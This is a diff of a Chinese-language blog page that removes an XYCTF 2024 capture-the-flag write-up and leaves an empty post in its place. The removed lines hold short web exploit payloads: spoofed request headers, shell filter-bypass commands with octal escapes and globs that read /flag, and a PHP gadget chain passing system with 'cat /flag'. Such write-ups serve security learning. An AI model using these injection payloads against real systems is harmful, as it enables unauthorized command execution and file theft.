@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      2024_XYCTF | yzzob_blog
+       | yzzob_blog
     
   </title>
   <meta name="author" content="yzz">
@@ -100,7 +100,7 @@
 	<!-- Page title -->
 	<p>
 		
-			「2024_XYCTF」
+			「」
 		
 	</p>
 
@@ -223,29 +223,12 @@
 		插件作者：KELEN
 		插件来源: https://github.com/KELEN/katelog
 -->
-
-	
-		<div class="layout-toc">
-			<div id="layout-toc">
-				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
-			</div>
-		</div>
-
-		
-<script src="/plugin/toc/katelog.min.js"></script>
-
-
-		
 	 
 
 <div class="layout-post">
 	<div id="layout-post">
 		<div class="article-title">
 			
-	<a href="/2024/05/22/2024_XYCTF/" itemprop="url">
-		2024_XYCTF
-	</a>
-
 		</div>
 
 		<div class="article-meta">
@@ -259,9 +242,9 @@
 
 	更新于
 
-	<a href="/2024/05/22/2024_XYCTF/" itemprop="url">
-		<time datetime="2024-05-22T09:50:44.849Z" itemprop="dateUpdated">
-	  		2025-03-30
+	<a href="/2025/03/31/2025-03-31/" itemprop="url">
+		<time datetime="2025-03-31T08:38:21.302Z" itemprop="dateUpdated">
+	  		2025-03-31
 	  </time>
 	</a> 
 
@@ -279,50 +262,7 @@
 		</div>
 
 		<div class="article-content" id="article-content">
-			<h1><span id="1题目类别2题目名称">1题目类别2题目名称</span></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参考链接:</span><br><span class="line">https://blog.csdn.net/administratorlws/article/details/138224349</span><br></pre></td></tr></table></figure>
-
-
-
-<h1><span id="web">WEB</span></h1><h2><span id="ezhttp">ezhttp</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">扫描得到http://xyctf.top:43531/robots.txt</span><br><span class="line">得到账号密码</span><br><span class="line">! username=XYCTF&amp;password=%40JOILha%21wuigqi123%24</span><br><span class="line">只能和上面内容距离一格</span><br><span class="line">! :前面不要有空格</span><br><span class="line">1 不是yuanshen.com来的我不要</span><br><span class="line">Referer: yuanshen.com</span><br><span class="line"># 两个referer的话,取上面那个</span><br><span class="line">2 你用的不是XYCTF的浏览器</span><br><span class="line">User-Agent: XYCTF</span><br><span class="line">3 非本地用户禁止访问</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">xff打咩</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">4 不是从ymzx.qq.com代理来的我不玩</span><br><span class="line">Via: ymzx.qq.com</span><br><span class="line">5 想吃点XYCTF的小饼干</span><br><span class="line">cookie: XYCTF !s</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2><span id="ezmake">ezMake</span></h2><p>$被过滤了</p>
-<p>答案:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $$(&lt; flag)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../img/image-20240427102030443.png" alt="image-20240427102030443"></p>
-<h2><span id="ezmake">ez?Make</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入ls</span><br><span class="line">发现被过滤了</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../img/image-20240427103048824.png" alt="image-20240427103048824"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cat /flag</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&gt;&gt;more</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&gt;&gt;[d-h][k-m][9-z][e-h]</span><br><span class="line">区间取值</span><br></pre></td></tr></table></figure>
-
-<p>答案:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;more [d-h][k-m][9-z][e-h]</span><br></pre></td></tr></table></figure>
-
-<h2><span id="εzмkε">εZ?¿м@Kε¿?</span></h2><p>答案</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$(&lt;$&lt;)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">这个命令看起来是在尝试使用两个输入重定向符号来传递输入给一个空的文件描述符。通常，&lt;符号用于</span><br><span class="line"></span><br><span class="line">输入重定向，而&lt; 是一种 s h e l l 变量，表示从标准输入中读取。但是在这个命令中， &lt;是一种shell变量，表示从标准输入中读取。但是在这个命令中，&lt;是一种shell变量，表示从标准输入中读取。但是在这个命令中，$表示当前shell的进</span><br><span class="line"></span><br><span class="line">程ID，而&lt;后面跟着的&lt;又被理解为输入重定向符号。所以整个命令看起来有些混乱。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">首先， $$ 是一个特殊的shell变量，代表当前Shell进程的ID（PID）。在Unix和类Unix系统中，这个变量通常用于引用当前Shell进程的ID。</span><br><span class="line"></span><br><span class="line">然后， &lt; 符号通常用于输入重定向，表示将一个文件的内容作为命令的输入，或者从文件中读取内容。</span><br><span class="line"></span><br><span class="line">接着， $&lt; 看起来像是一个尝试使用 &lt; 符号来读取 $ 字符后面的内容，但这在常规的shell语法中是不被接受的。</span><br><span class="line"></span><br><span class="line">因此，整个命令 $( &lt; (&lt;(&lt;&lt;) 似乎尝试将当前Shell进程的ID作为文件名，然后使用 &lt; 符号将其作为输入重定向，但这在大多数情况下并不合法，因为Shell通常不会允许使用PID来打开文件。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2><span id="ezmd5">ezmd5</span></h2><p>网上找两张md5一样,但是内容不一样的图片</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/rclijia/article/details/114400242?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171418577316800186537941%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=171418577316800186537941&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-114400242-null-null.142^v100^control&amp;utm_term=%E4%B8%A4%E5%BC%A0md5&amp;spm=1018.2226.3001.4187</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../img/barry.jpg" alt="barry"></p>
-<p><img src="/../img/james.jpg" alt="james"></p>
-<h2><span id="ezpop">ezPOP</span></h2><h2><span id="ezrce八进制">ezRCE;八进制</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$&#x27;\143\141\164&#x27;&lt;$&#x27;\057\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;\143\141\164&#x27;&lt;$&#x27;\57\146\154\141\147&#x27; // cat&lt;/flag</span><br></pre></td></tr></table></figure>
-
-<h2><span id="ezclass">ezclass</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">((<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>))-&gt;<span class="variable">$c</span>())((<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>))-&gt;<span class="variable">$c</span>());</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=<span class="built_in">Error</span>&amp;aa=system&amp;c=getMessage&amp;b=<span class="built_in">Error</span>&amp;bb=cat%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure>
-
-
-
-<h1><span id="reverse">Reverse</span></h1><h2><span id="你是真的大学生吗">你是真的大学生吗？</span></h2>	
+				
 		</div>
 		
 		<div id="current-post-cover" data-scr="/img/cart_cover.jpg"></div>
@@ -340,12 +280,8 @@
 	<span>
 		<a id="totop-post-page">返回顶部</a>
 		
-			<a href="/2024/05/22/cpp/" title="cpp" rel="prev">
-				&laquo;上一篇
-			</a>
 		
-		
-			<a href="/2024/05/22/3_mics/" title="misc" rel="next">
+			<a href="/2025/03/31/Excalidraw/Drawing%202025-03-31%2016.30.51.excalidraw/" title="" rel="next">
 				下一篇&raquo;
 			</a>
 			
@@ -363,28 +299,6 @@
 <div class="relate-post">
 	
 		<ul>
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2025/03/31/2025-03-31/" title="">
-											
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								三月 31日, 2025				
-							</p>
-							<p class="relate-post-content">
-								
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2025/03/31/2025-03-31/" title="">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt=""/>
-							</a>
-						</div>
-					</li>												
 			
 					<li>
 						<div class="relate-post-text">
@@ -633,6 +547,35 @@ DAPP（Decentralized application）:去中心化app,WEB前端
 							<a href="/2024/07/02/web3/" title="web3">				
 								
 								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="web3"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/06/29/conclusion/" title="期末总结">
+								期末总结			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 29日, 2024				
+							</p>
+							<p class="relate-post-content">
+								1title:期末总结
+
+
+
+202406英语听力,不会写
+写题顺序:长篇阅读,仔细阅读,翻译,选词填空
+web操作系统多媒体技术计算机网络软件工程基础出了作业题原题和最后发的复习卷,老师单独保存的题目,要注意
+数字电路智能感知技术数...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/06/29/conclusion/" title="期末总结">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="期末总结"/>
 							</a>
 						</div>
 					</li>												
